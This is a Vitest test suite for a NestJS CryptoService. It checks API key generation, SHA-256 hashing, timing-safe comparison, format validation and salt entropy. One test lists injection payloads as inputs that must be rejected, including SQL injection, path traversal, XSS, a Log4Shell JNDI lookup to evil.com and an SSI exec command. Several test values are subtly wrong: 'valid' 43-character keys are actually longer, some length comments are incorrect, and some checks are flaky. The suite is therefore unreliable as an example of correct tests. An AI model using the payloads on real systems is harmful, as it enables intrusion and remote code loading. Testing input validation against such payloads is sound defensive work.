import { vi, describe, it, expect, beforeEach, afterEach, beforeAll, afterAll } from 'vitest';
import { Test, TestingModule } from '@nestjs/testing';
import { CryptoService } from './crypto.service';
import * as crypto from 'crypto';

describe('CryptoService - Security Tests', () => {
  let service: CryptoService;

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [CryptoService],
    }).compile();

    service = module.get<CryptoService>(CryptoService);
  });

  describe('API Key Generation Security', () => {
    it('should generate cryptographically secure API keys', () => {
      // Act
      const apiKey1 = service.generateApiKey();
      const apiKey2 = service.generateApiKey();
      const apiKey3 = service.generateApiKey();

      // Assert
      expect(apiKey1).toBeDefined();
      expect(apiKey2).toBeDefined();
      expect(apiKey3).toBeDefined();

      // Keys should be different
      expect(apiKey1).not.toBe(apiKey2);
      expect(apiKey2).not.toBe(apiKey3);
      expect(apiKey1).not.toBe(apiKey3);

      // Keys should have correct length (32 bytes = 43 chars in base64url)
      expect(apiKey1).toHaveLength(43);
      expect(apiKey2).toHaveLength(43);
      expect(apiKey3).toHaveLength(43);
    });

    it('should generate base64url encoded keys without padding', () => {
      // Act
      const apiKey = service.generateApiKey();

      // Assert
      expect(apiKey).toMatch(/^[A-Za-z0-9_-]{43}$/); // Base64url without padding
      expect(apiKey).not.toContain('+');
      expect(apiKey).not.toContain('/');
      expect(apiKey).not.toContain('=');
    });

    it('should have high entropy in generated keys', () => {
      // Generate multiple keys to analyze entropy
      const keys = Array.from({ length: 100 }, () => service.generateApiKey());

      // Count unique characters across all keys
      const allChars = keys.join('');
      const uniqueChars = new Set(allChars);

      // Should use most of the base64url character set
      expect(uniqueChars.size).toBeGreaterThan(50); // At least 50 different chars

      // Keys should be uniformly random (basic statistical test)
      const firstCharCounts = new Map<string, number>();
      keys.forEach((key) => {
        const firstChar = key[0];
        firstCharCounts.set(
          firstChar,
          (firstCharCounts.get(firstChar) ?? 0) + 1,
        );
      });

      // No single character should dominate the first position
      const maxCount = Math.max(...firstCharCounts.values());
      expect(maxCount).toBeLessThan(keys.length * 0.2); // Less than 20% dominance
    });

    it('should generate keys that are statistically random', () => {
      // Generate keys and convert to bytes for analysis
      const keys = Array.from({ length: 50 }, () => service.generateApiKey());

      // Convert base64url back to bytes for entropy analysis
      const allBytes: number[] = [];
      keys.forEach((key) => {
        // Convert base64url to base64
        const base64 = key.replace(/-/g, '+').replace(/_/g, '/');
        const buffer = Buffer.from(base64, 'base64');
        allBytes.push(...Array.from(buffer));
      });

      // Basic entropy test: count different byte values
      const byteCounts = new Map<number, number>();
      allBytes.forEach((byte) => {
        byteCounts.set(byte, (byteCounts.get(byte) ?? 0) + 1);
      });

      // Should have good distribution of byte values
      expect(byteCounts.size).toBeGreaterThan(200); // Many different byte values
    });

    it('should not be predictable based on timing', () => {
      // Generate keys at different times and ensure they're not related
      const key1 = service.generateApiKey();

      // Small delay
      const start = Date.now();
      while (Date.now() - start < 1) {
        // 1ms delay - intentional busy wait for timing test
      }

      const key2 = service.generateApiKey();

      // Keys should be completely different despite similar generation time
      expect(key1).not.toBe(key2);

      // Convert to bytes and check for any patterns
      const bytes1 = Buffer.from(
        key1.replace(/-/g, '+').replace(/_/g, '/'),
        'base64',
      );
      const bytes2 = Buffer.from(
        key2.replace(/-/g, '+').replace(/_/g, '/'),
        'base64',
      );

      // Should not have similar starting bytes
      expect(bytes1[0]).not.toBe(bytes2[0]); // Very low probability if truly random
    });
  });

  describe('API Key Hashing Security', () => {
    it('should produce consistent hashes for the same input', async () => {
      // Arrange
      const apiKey = 'test-api-key-12345';

      // Act
      const hash1 = service.hashApiKey(apiKey);
      const hash2 = service.hashApiKey(apiKey);
      const hash3 = service.hashApiKey(apiKey);

      // Assert
      expect(hash1).toBe(hash2);
      expect(hash2).toBe(hash3);
      expect(hash1).toBe(hash3);
    });

    it('should produce different hashes for different inputs', async () => {
      // Arrange
      const apiKey1 = 'test-api-key-12345';
      const apiKey2 = 'test-api-key-67890';
      const apiKey3 = 'different-key';

      // Act
      const hash1 = service.hashApiKey(apiKey1);
      const hash2 = service.hashApiKey(apiKey2);
      const hash3 = service.hashApiKey(apiKey3);

      // Assert
      expect(hash1).not.toBe(hash2);
      expect(hash2).not.toBe(hash3);
      expect(hash1).not.toBe(hash3);
    });

    it('should produce SHA-256 hashes in hex format', async () => {
      // Arrange
      const apiKey = 'test-api-key-12345';

      // Act
      const hash = service.hashApiKey(apiKey);

      // Assert
      expect(hash).toMatch(/^[a-f0-9]{64}$/); // SHA-256 hex is 64 chars
      expect(hash).toHaveLength(64);
    });

    it('should be resistant to collision attacks (avalanche effect)', async () => {
      // Test avalanche effect: small input change should cause large output change
      const baseKey = 'test-api-key-12345';
      const modifiedKey = 'test-api-key-12346'; // One character different

      const baseHash = service.hashApiKey(baseKey);
      const modifiedHash = service.hashApiKey(modifiedKey);

      // Convert to binary and count different bits
      const baseBits = BigInt('0x' + baseHash)
        .toString(2)
        .padStart(256, '0');
      const modifiedBits = BigInt('0x' + modifiedHash)
        .toString(2)
        .padStart(256, '0');

      let differentBits = 0;
      for (let i = 0; i < 256; i++) {
        if (baseBits[i] !== modifiedBits[i]) {
          differentBits++;
        }
      }

      // Should have approximately 50% different bits (avalanche effect)
      expect(differentBits).toBeGreaterThan(100); // At least ~40% different
      expect(differentBits).toBeLessThan(156); // At most ~60% different
    });

    it('should handle edge cases securely', async () => {
      // Test various edge cases
      const testCases = [
        '', // Empty string
        ' ', // Single space
        '\n\t\r', // Whitespace characters
        'a', // Single character
        'A'.repeat(1000), // Very long string
        '🔑🚀💎', // Unicode characters
        '\x00\x01\x02', // Control characters
        'test\nkey\twith\rspecial\u0000chars', // Mixed special chars
      ];

      const hashes: string[] = [];
      for (const testCase of testCases) {
        const hash = service.hashApiKey(testCase);
        hashes.push(hash);

        // Each hash should be valid SHA-256 hex
        expect(hash).toMatch(/^[a-f0-9]{64}$/);
      }

      // All hashes should be different
      const uniqueHashes = new Set(hashes);
      expect(uniqueHashes.size).toBe(testCases.length);
    });

    it('should be computationally infeasible to reverse', async () => {
      // This is more of a documentation test - we can't actually test cryptographic security
      // But we can verify that the hash doesn't contain obvious patterns from the input

      const apiKey = 'very-predictable-pattern-12345';
      const hash = service.hashApiKey(apiKey);

      // Hash shouldn't contain obvious patterns from input
      expect(hash).not.toContain('predictable');
      expect(hash).not.toContain('pattern');
      expect(hash).not.toContain('12345');
      expect(hash).not.toContain('very');
    });
  });

  describe('Timing-Safe Comparison Security', () => {
    it('should compare hashes in constant time', () => {
      // Arrange
      const hash1 = 'a'.repeat(64);
      const hash2 = 'b'.repeat(64);
      const hash3 = 'a'.repeat(64);

      // Act & Assert
      expect(service.compareHashes(hash1, hash2)).toBe(false);
      expect(service.compareHashes(hash1, hash3)).toBe(true);
      expect(service.compareHashes(hash2, hash3)).toBe(false);
    });

    it('should prevent timing attacks', () => {
      // Test that comparison time doesn't reveal information about where strings differ
      const correctHash =
        'abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890';

      // Different hashes with differences at different positions
      const wrongAtStart =
        'zbcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890';
      const wrongAtMiddle =
        'abcdef1234567890abcdef1234567890zbcdef1234567890abcdef1234567890';
      const wrongAtEnd =
        'abcdef1234567890abcdef1234567890abcdef1234567890abcdef123456789z';

      // All comparisons should take similar time (constant time)
      const timings: number[] = [];

      for (const wrongHash of [wrongAtStart, wrongAtMiddle, wrongAtEnd]) {
        const start = process.hrtime.bigint();
        service.compareHashes(correctHash, wrongHash);
        const end = process.hrtime.bigint();
        timings.push(Number(end - start));
      }

      // Timing differences should be minimal for constant-time operation
      const avgTime = timings.reduce((a, b) => a + b, 0) / timings.length;
      const maxDeviation = Math.max(
        ...timings.map((t) => Math.abs(t - avgTime)),
      );

      // Allow some variance but not too much (implementation dependent)
      expect(maxDeviation).toBeLessThan(avgTime); // Less than 100% deviation
    });

    it('should handle different length hashes securely', () => {
      // Arrange
      const hash1 = 'a'.repeat(64);
      const shortHash = 'a'.repeat(32);
      const longHash = 'a'.repeat(128);

      // Act & Assert
      expect(service.compareHashes(hash1, shortHash)).toBe(false);
      expect(service.compareHashes(hash1, longHash)).toBe(false);
      expect(service.compareHashes(shortHash, longHash)).toBe(false);
    });

    it('should handle malformed hashes gracefully', () => {
      // Arrange
      const validHash = 'a'.repeat(64);
      const invalidHashes = [
        'not-hex-characters!@#$',
        '',
        null as any,
        undefined as any,
        123 as any,
        'ABCDEF1234567890', // Too short but valid hex
      ];

      // Act & Assert
      for (const invalidHash of invalidHashes) {
        expect(() =>
          service.compareHashes(validHash, invalidHash),
        ).not.toThrow();
        expect(service.compareHashes(validHash, invalidHash)).toBe(false);
      }
    });

    it('should use constant-time comparison from crypto module', () => {
      // Verify that we're actually using the crypto module's timing-safe comparison
      const hash1 =
        'abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890';
      const hash2 =
        'abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890';

      // Mock crypto.timingSafeEqual to verify it's being called
      const timingSafeEqualSpy = vi.spyOn(crypto, 'timingSafeEqual');

      service.compareHashes(hash1, hash2);

      expect(timingSafeEqualSpy).toHaveBeenCalled();

      timingSafeEqualSpy.mockRestore();
    });
  });

  describe('API Key Format Validation Security', () => {
    it('should accept valid base64url format keys', () => {
      // Valid base64url keys (43 characters, no padding)
      const validKeys = [
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk123456789',
        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN-_12345',
        '1234567890-_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef',
        service.generateApiKey(), // Use actual generated key
      ];

      for (const key of validKeys) {
        expect(service.isValidApiKeyFormat(key)).toBe(true);
      }
    });

    it('should reject invalid format keys', () => {
      const invalidKeys = [
        '', // Empty
        'too-short', // Too short
        'a'.repeat(44), // Too long
        'a'.repeat(42), // Too short by one
        'valid-key-but-contains-invalid-chars!@#$%^&*()', // Invalid characters
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk12345678=', // Contains padding
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk+/123456', // Contains +/
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk1234567', // 42 chars
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk12345678', // 44 chars
        null as any, // Null
        undefined as any, // Undefined
        123 as any, // Number
        {}, // Object
        'normal-text-string-that-is-not-base64url-format', // Normal text
        '😀🔑🚀💎👍🎉', // Emojis
        '\x00\x01\x02', // Control characters
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk\n12345', // Contains newline
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk 12345', // Contains space
      ];

      for (const key of invalidKeys) {
        expect(service.isValidApiKeyFormat(key)).toBe(false);
      }
    });

    it('should prevent format injection attacks', () => {
      const maliciousInputs = [
        "'; DROP TABLE api_keys; --",
        '../../../../etc/passwd',
        '<script>alert(1)</script>',
        '%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
        '\x00admin\x00',
        '..\\..\\windows\\system32\\cmd.exe',
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}', // Template injection
        '<!--#exec cmd="ls"-->', // SSI injection
      ];

      for (const input of maliciousInputs) {
        expect(service.isValidApiKeyFormat(input)).toBe(false);
      }
    });

    it('should handle edge cases safely', () => {
      const edgeCases = [
        String.fromCharCode(0), // Null character
        '\uFEFF' + 'a'.repeat(42), // BOM + valid length
        'a'.repeat(43) + '\0', // Valid + null
        'a'.repeat(21) + '\n' + 'b'.repeat(21), // Valid length with newline
      ];

      for (const testCase of edgeCases) {
        expect(() => service.isValidApiKeyFormat(testCase)).not.toThrow();
        expect(service.isValidApiKeyFormat(testCase)).toBe(false);
      }
    });

    it('should use strict regex matching', () => {
      // Test that the regex is anchored and doesn't allow partial matches
      const testCases = [
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk123456789extra', // Valid + extra
        'prefixABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk123456789', // Prefix + valid
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk123456789\n', // Valid + newline
        '\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk123456789', // Newline + valid
      ];

      for (const testCase of testCases) {
        expect(service.isValidApiKeyFormat(testCase)).toBe(false);
      }
    });
  });

  describe('General Hash Function Security', () => {
    it('should produce consistent hashes for strings', () => {
      const input = 'test-string-to-hash';

      const hash1 = service.hashString(input);
      const hash2 = service.hashString(input);

      expect(hash1).toBe(hash2);
      expect(hash1).toMatch(/^[a-f0-9]{64}$/);
    });

    it('should produce different hashes for different strings', () => {
      const inputs = ['string1', 'string2', 'different', ''];
      const hashes = inputs.map((input) => service.hashString(input));

      // All hashes should be unique
      const uniqueHashes = new Set(hashes);
      expect(uniqueHashes.size).toBe(inputs.length);
    });
  });

  describe('Secure Random Generation Security', () => {
    it('should generate cryptographically secure random strings', () => {
      const random1 = service.generateSecureRandom(32);
      const random2 = service.generateSecureRandom(32);
      const random3 = service.generateSecureRandom(32);

      // Should be different
      expect(random1).not.toBe(random2);
      expect(random2).not.toBe(random3);
      expect(random1).not.toBe(random3);

      // Should have correct length
      expect(random1).toHaveLength(32);
      expect(random2).toHaveLength(32);
      expect(random3).toHaveLength(32);

      // Should be hex strings
      expect(random1).toMatch(/^[a-f0-9]{32}$/);
      expect(random2).toMatch(/^[a-f0-9]{32}$/);
      expect(random3).toMatch(/^[a-f0-9]{32}$/);
    });

    it('should handle different lengths correctly', () => {
      const lengths = [1, 8, 16, 32, 64, 128];

      for (const length of lengths) {
        const random = service.generateSecureRandom(length);
        expect(random).toHaveLength(length);
        expect(random).toMatch(/^[a-f0-9]*$/);
      }
    });

    it('should generate high entropy random strings', () => {
      // Generate multiple random strings and check distribution
      const randoms = Array.from({ length: 100 }, () =>
        service.generateSecureRandom(16),
      );

      // Count unique characters
      const allChars = randoms.join('');
      const uniqueChars = new Set(allChars);

      // Should use most hex characters (0-9, a-f)
      expect(uniqueChars.size).toBeGreaterThanOrEqual(14); // At least 14 of 16 hex chars

      // Check for uniform distribution (basic test)
      const charCounts = new Map<string, number>();
      for (const char of allChars) {
        charCounts.set(char, (charCounts.get(char) ?? 0) + 1);
      }

      // No character should be overly dominant
      const totalChars = allChars.length;
      const expectedFreq = totalChars / 16; // Expected frequency per hex char

      for (const count of charCounts.values()) {
        // Should be within reasonable range of expected frequency
        expect(count).toBeGreaterThan(expectedFreq * 0.5);
        expect(count).toBeLessThan(expectedFreq * 1.5);
      }
    });
  });

  describe('Salt Generation Security', () => {
    it('should generate cryptographically secure salts', () => {
      const salt1 = service.generateSalt();
      const salt2 = service.generateSalt();
      const salt3 = service.generateSalt();

      // Should be different
      expect(salt1).not.toBe(salt2);
      expect(salt2).not.toBe(salt3);
      expect(salt1).not.toBe(salt3);

      // Should be hex strings of correct length (32 bytes = 64 hex chars)
      expect(salt1).toHaveLength(64);
      expect(salt2).toHaveLength(64);
      expect(salt3).toHaveLength(64);

      expect(salt1).toMatch(/^[a-f0-9]{64}$/);
      expect(salt2).toMatch(/^[a-f0-9]{64}$/);
      expect(salt3).toMatch(/^[a-f0-9]{64}$/);
    });

    it('should have high entropy', () => {
      const salts = Array.from({ length: 50 }, () => service.generateSalt());

      // All salts should be unique
      const uniqueSalts = new Set(salts);
      expect(uniqueSalts.size).toBe(50);

      // Check character distribution
      const allChars = salts.join('');
      const uniqueChars = new Set(allChars);
      expect(uniqueChars.size).toBe(16); // Should use all hex characters
    });
  });

  describe('Performance and DoS Resistance', () => {
    it('should handle hashing of large inputs efficiently', async () => {
      // Test with progressively larger inputs
      const sizes = [1000, 10000, 100000];

      for (const size of sizes) {
        const largeInput = 'A'.repeat(size);

        const start = process.hrtime.bigint();
        const hash = service.hashApiKey(largeInput);
        const end = process.hrtime.bigint();

        const timeMs = Number(end - start) / 1000000;

        // Should complete in reasonable time (adjust threshold as needed)
        expect(timeMs).toBeLessThan(100); // Less than 100ms
        expect(hash).toMatch(/^[a-f0-9]{64}$/);
      }
    });

    it('should not be vulnerable to hash flooding attacks', async () => {
      // Generate many different inputs that could potentially cause collisions
      const inputs = Array.from({ length: 1000 }, (_, i) => `test-input-${i}`);

      const hashes: string[] = [];
      const startTime = Date.now();

      for (const input of inputs) {
        const hash = service.hashApiKey(input);
        hashes.push(hash);
      }

      const endTime = Date.now();
      const totalTime = endTime - startTime;

      // Should complete in reasonable time
      expect(totalTime).toBeLessThan(1000); // Less than 1 second

      // All hashes should be unique (no intentional collisions)
      const uniqueHashes = new Set(hashes);
      expect(uniqueHashes.size).toBe(hashes.length);
    });

    it('should handle concurrent operations safely', async () => {
      // Test concurrent hashing operations
      const promises = Array.from({ length: 100 }, (_, i) =>
        service.hashApiKey(`concurrent-test-${i}`),
      );

      const hashes = await Promise.all(promises);

      // All should be unique and valid
      const uniqueHashes = new Set(hashes);
      expect(uniqueHashes.size).toBe(100);

      hashes.forEach((hash) => {
        expect(hash).toMatch(/^[a-f0-9]{64}$/);
      });
    });
  });
});
